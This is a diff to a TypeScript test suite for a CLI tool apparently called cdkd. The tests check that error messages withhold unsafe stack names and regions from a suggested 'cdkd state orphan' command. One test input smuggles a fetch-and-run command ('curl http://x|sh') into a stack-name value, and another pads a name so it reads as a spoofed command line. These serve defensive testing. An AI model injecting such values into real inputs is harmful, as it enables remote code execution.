@@ -3958,16 +3958,35 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
       'a shell metacharacter',
       "A'; curl http://x|sh; echo '",
       (m: string) => {
-        // SHELL-QUOTED, so the pasteable line cannot break out of its argument.
-        expect(m).not.toMatch(/cdkd state orphan [^'\n]*;/);
-        // Named, so no note, and LAST: nothing follows the command.
-        expect(m).toContain("cdkd state orphan 'Root~A'\\''; curl http://x|sh; echo '\\'''");
-        expect(
-          m.endsWith(
-            "Drop it with: cdkd state orphan 'Root~A'\\''; curl http://x|sh; echo '\\''' --stack-region us-east-1"
-          )
-        ).toBe(true);
-        expect(m).not.toContain('names neither');
+        // WITHHELD as not a plain identifier (go-to-k/cdkd#3997): the command
+        // names neither value, so no metacharacter reaches the pasteable line.
+        expect(m).not.toMatch(/cdkd state orphan [^\n]*curl/);
+        expect(m).toContain(
+          "its record's stack name is not a plain identifier (a letter or digit, then letters, " +
+            "digits, '~', '_', '.' or '-'), which cdkd does not print on a command line."
+        );
+        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+          true
+        );
+      },
+    ],
+    [
+      // The shape go-to-k/cdkd#3997 names: a name padded so a terminal wraps
+      // part of it onto what reads as its own `…with: cdkd …` line. It renders
+      // EXACTLY (medial spaces survive `displaySafe`), so only the
+      // plain-identifier rule withholds it.
+      'medial padding spelling a second command line',
+      `A${' '.repeat(80)}Drop it with: cdkd state orphan X`,
+      (m: string) => {
+        // The command line carries holes, not the padded name. (The prose head
+        // above still names it: the value-in-prose shape, tracked apart.)
+        expect(m.split('\n').at(-1)).toBe(
+          "Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'"
+        );
+        expect(m).toContain("its record's stack name is not a plain identifier");
+        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+          true
+        );
       },
     ],
     [
@@ -4107,6 +4126,29 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
     }
   );
 
+  it('withholds a REGION that renders exactly but is not a plain identifier, naming only it (go-to-k/cdkd#3997)', async () => {
+    const region = 'us-east-1 x';
+    const root = makeState({
+      stackName: 'Root',
+      region,
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ [`Root|${region}`]: root }) as S3StateBackend;
+    const message = (
+      (await buildCdkdStateStackTree('Root', region, backend).catch((e: unknown) => e)) as Error
+    ).message;
+    expect(message).toContain(
+      "The next line's command names neither value, because its record's region is not a plain " +
+        "identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which cdkd " +
+        'does not print on a command line.'
+    );
+    // Only the region: the stack name is plain and is not blamed.
+    expect(message).not.toContain('stack name is not a plain identifier');
+    // A region is a flag's value, so its hole may be filled.
+    expect(message).toContain('replacing each quoted hole');
+    expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
+  });
+
   it.each([
     ['stack name', 'q'.repeat(STACK_REF_MAX_CODE_POINTS + 1), 'us-east-1', 'is too long to print'],
     ['region', 'Root', '', 'is empty'],
@@ -4193,14 +4235,17 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
     ).toBe(true);
   });
 
-  it('answers the two reasons orphanCommandFor cannot reach with a true sentence, not a throw (go-to-k/cdkd#3924 m2)', () => {
+  it('answers the reason orphanCommandFor cannot reach with a true sentence, not a throw (go-to-k/cdkd#3924 m2)', () => {
     // A throw would escape the state-deletion warn's `catch` (M4's hazard).
-    for (const reason of ['pattern-shaped', 'not-plain'] as const) {
-      for (const positional of [true, false]) {
-        expect(orphanWithholdWhy(reason, positional)).toBe(
-          "cannot be printed as an argument to 'cdkd state orphan'"
-        );
-      }
+    // `not-plain` IS reachable since go-to-k/cdkd#3997 and has its own sentence.
+    for (const positional of [true, false]) {
+      expect(orphanWithholdWhy('pattern-shaped', positional)).toBe(
+        "cannot be printed as an argument to 'cdkd state orphan'"
+      );
+      expect(orphanWithholdWhy('not-plain', positional)).toBe(
+        "is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which " +
+          'cdkd does not print on a command line'
+      );
     }
   });
 
@@ -4263,13 +4308,16 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
         );
         const message = (thrown as Error).message;
         // Each case's PREMISE, pinned before the paste: a payload name is
-        // NAMED, shell-quoted; its `-`-leading twin is withheld, both holes,
-        // with the no-fill note above. Inert spans alone would pass a gate
-        // that stopped doing either.
+        // WITHHELD as not a plain identifier (go-to-k/cdkd#3997); its
+        // `-`-leading twin is withheld with the no-fill note above. Inert
+        // spans alone would pass a gate that stopped withholding.
         expect(message).toContain(
           rootName === value
-            ? `\nDrop it with: cdkd state orphan ${shellQuote(value)} --stack-region us-east-1`
-            : "so do not fill a hole with it.\nDrop it with: cdkd state orphan '<stack>' --stack-region '<region>'"
+            ? "is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which cdkd does not print on a command line."
+            : 'so do not fill a hole with it.'
+        );
+        expect(message).toContain(
+          "\nDrop it with: cdkd state orphan '<stack>' --stack-region '<region>'"
         );
         messages.push(message);
       }
